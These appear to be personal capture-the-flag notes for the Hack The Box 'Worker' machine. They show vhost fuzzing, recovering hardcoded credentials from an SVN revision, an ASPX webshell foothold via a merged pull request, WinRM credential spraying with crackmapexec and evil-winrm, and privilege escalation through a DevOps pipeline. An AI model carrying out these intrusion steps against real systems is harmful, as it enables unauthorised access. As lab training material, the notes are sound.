# ippsec this time
### Grab more hostnames
```bash
❯ curl http://dimension.worker.htb/\#work -s -q | grep -o http://.\*.worker.htb | sed 's/http:\/\///g'
alpha.worker.htb
cartoon.worker.htb
lens.worker.htb
solid-state.worker.htb
spectral.worker.htb
story.worker.htb
```

### vhost fuzz same as above
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://$IP -H 'Host: FUZZ.worker.htb' -fs 703
```

### Gitlog, svn up -r 2
```bash
❯ svn up -r 2
Updating '.':
A    deploy.ps1
Updated to revision 2.
❯ ls
deploy.ps1  dimension.worker.htb  ferox-http_10_129_2_29:80_-1674788588.state  README.md  results
❯ cat deploy.ps1
$user = "nathen" 
$plain = "wendel98"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

### devops.worker.htb
$user = "nathen" 
$plain = "wendel98"

### Burp NTLM
There is one catch - it won’t work with Burp on in the default configuration. Because it’s using NTLM authentication, Burp breaks it. I showed why in Beyond Root for Sizzle.

Still, it’s useful to know how to get the tools to work for you, and QTC (who happened to earn root blood on Worker) provided that on Twitter:
The problem is that NTLM authenticates the TCP connection, which is not kept alive when using a proxy. However, you can still use Burp:

1. Proxy -> Options -> uncheck "Set Connection Close"
2. User Options -> Platform Authentication -> Add NTLM

### Foothold
Choose an ASPX webshell because of the `X-Powered-By: ASP.NET` header seen during Recon.

Need to use a PR to merge to master to deploy successfully.

http://spectral.worker.htb/cmdasp.aspx

### Enum
```bash
❯ cat passwd | awk '{ print $1 }' > users
❯ cat passwd | awk '{ print $3 }' > passwords

❯ crackmapexec winrm $IP -u users -p passwords --no-bruteforce

WINRM       10.129.96.137   5985   NONE             [+] None\robisl:wolves11 (Pwn3d!)
```
`evil-winrm -i $IP -u robisl -p wolves11`
Creds here show the user is a member of the "Build Administrators"

### Priv
Build a pipeline properly and add ad admin user with inline powershell script.

### writeup
The box been updated. So the offical is perferred.
* https://0xdf.gitlab.io/2021/01/30/htb-worker.html#shell-as-iis